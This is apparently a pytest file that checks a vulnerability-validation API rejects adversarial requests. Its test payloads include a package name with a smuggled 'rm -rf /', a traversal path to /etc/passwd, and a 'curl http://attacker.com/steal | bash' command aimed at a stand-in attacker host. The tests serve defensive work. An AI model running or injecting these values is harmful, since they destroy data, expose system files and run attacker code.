"""Adversarial input tests per Section 27a.

Explicitly verifies that the engine repels:
1. Shell metacharacters in package names (e.g. "pkg; rm -rf /")
2. Directory traversal attacks (e.g. "../../etc/passwd")
3. Target asset.id resolving outside lab registry
4. Ports outside target's allowed_ports whitelist
5. Oversized payloads (> 64 KB -> HTTP 413)
6. Smuggled executable commands (e.g. "command": "rm -rf /" -> HTTP 400)
7. Unregistered/malicious probe type overrides (HTTP 400)
"""

from fastapi.testclient import TestClient
from api.server import app

client = TestClient(app)


def test_adversarial_shell_metacharacter_rejection():
    # Attempt command injection via package name
    payload = {
        "finding_id": "F-ADV-001",
        "asset": {"id": "shop-api-01"},
        "vulnerability": {"title": "Exploit attempt"},
        "location": {"type": "package", "package": "requests; rm -rf /"},
        "evidence": {"claimed_version": "1.0.0"},
    }
    resp = client.post("/validate", json=payload)
    assert resp.status_code == 400
    data = resp.json()
    assert data["error"] == "invalid_probe_request"
    assert "Invalid package name" in data["detail"]


def test_adversarial_directory_traversal_rejection():
    # Attempt directory traversal to read system passwords or files outside lab
    payload = {
        "finding_id": "F-ADV-002",
        "asset": {"id": "shop-api-01"},
        "vulnerability": {"title": "LFI attempt"},
        "location": {"type": "file", "path": "../../../../etc/passwd"},
        "evidence": {"expected_exists": True},
    }
    resp = client.post("/validate", json=payload)
    assert resp.status_code == 400
    data = resp.json()
    assert data["error"] == "invalid_probe_request"
    assert "Directory traversal detected" in data["detail"] or "outside lab root" in data["detail"]


def test_adversarial_unregistered_asset_handled_safely():
    # Target asset outside lab network allowlist must never be queried over network
    payload = {
        "finding_id": "F-ADV-003",
        "asset": {"id": "attacker-controlled-c2.com"},
        "vulnerability": {"title": "SSRF test"},
        "location": {"type": "endpoint", "endpoint": "/leak"},
        "evidence": {"expected_status": 200},
    }
    resp = client.post("/validate", json=payload)
    # Per Section 25: Unregistered asset.id returns 200 with status: INCONCLUSIVE
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "INCONCLUSIVE"
    assert data["confidence"] <= 0.20
    assert any("not in the controlled lab target registry" in r for r in data["reason"])


def test_adversarial_unauthorized_port_rejection():
    # Port scan / connection to unapproved port (e.g. 22 or 445 on shop-api-01)
    payload = {
        "finding_id": "F-ADV-004",
        "asset": {"id": "shop-api-01"},
        "vulnerability": {"title": "Port scan"},
        "location": {"type": "port", "port": 22},
        "evidence": {"expected_state": "OPEN"},
    }
    resp = client.post("/validate", json=payload)
    assert resp.status_code == 400
    data = resp.json()
    assert data["error"] == "invalid_probe_request"
    assert "not in the allowed_ports whitelist" in data["detail"]


def test_adversarial_oversized_payload_rejection():
    # Section 25 & 27a: Oversized finding payload -> HTTP 413
    huge_data = "A" * 70000  # > 64 KB
    headers = {"Content-Type": "application/json"}
    raw_body = f'{{"finding_id": "F-BIG", "asset": {{"id": "shop-api-01"}}, "pad": "{huge_data}"}}'

    resp = client.post("/validate", content=raw_body, headers=headers)
    assert resp.status_code == 413
    assert resp.json()["error"] == "payload_too_large"


def test_adversarial_embedded_command_rejection():
    # Section 25 & 27a: Request attempting to smuggle an executable command
    payload = {
        "finding_id": "F-ADV-006",
        "asset": {"id": "shop-api-01"},
        "vulnerability": {"title": "RCE injection"},
        "location": {"type": "package", "package": "requests"},
        "evidence": {"claimed_version": "2.25.1"},
        "command": "curl http://attacker.com/steal | bash",
    }
    resp = client.post("/validate", json=payload)
    assert resp.status_code == 400
    data = resp.json()
    assert data["error"] == "invalid_probe_request"
    assert "Arbitrary command injection is strictly prohibited" in data["detail"]


def test_adversarial_probe_override_rejection():
    # Attempting to specify an unknown or dangerous probe explicitly
    payload = {
        "finding_id": "F-ADV-007",
        "asset": {"id": "shop-api-01"},
        "vulnerability": {"title": "Probe override attempt"},
        "location": {"type": "package", "package": "requests"},
        "evidence": {"claimed_version": "2.25.1"},
        "probe": {"type": "EXPLOIT_SHELLCODE_RUNNER"},
    }
    resp = client.post("/validate", json=payload)
    assert resp.status_code == 400
    data = resp.json()
    assert data["error"] == "invalid_probe_request"
    assert "unknown or unregistered" in data["detail"]
